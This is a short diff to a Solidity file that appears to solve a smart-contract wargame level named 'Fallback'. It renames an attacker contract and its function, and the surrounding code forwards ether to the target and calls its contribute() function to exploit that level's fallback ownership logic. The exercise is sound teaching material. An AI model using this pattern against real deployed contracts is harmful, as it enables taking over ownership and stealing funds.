@@ -39,7 +39,7 @@ contract Fallback {
 interface FallbacI {
     function contribute() external payable;
 }
-contract Kek {
+contract Hack {
     address payable contractAddress ;
     address owner;
     FallbacI public fallbackContract;
@@ -50,7 +50,7 @@ contract Kek {
     }
 receive() external payable {
 }
-function fallkek() public  payable{
+function fallhach() public  payable{
     require(msg.sender == owner);
    (bool success,) = (contractAddress).call{value:msg.value}("");
    require(success); 
@@ -63,3 +63,4 @@ function fallkek() public  payable{
 fallbackContract.contribute{value: msg.value}();
  }
 }
+
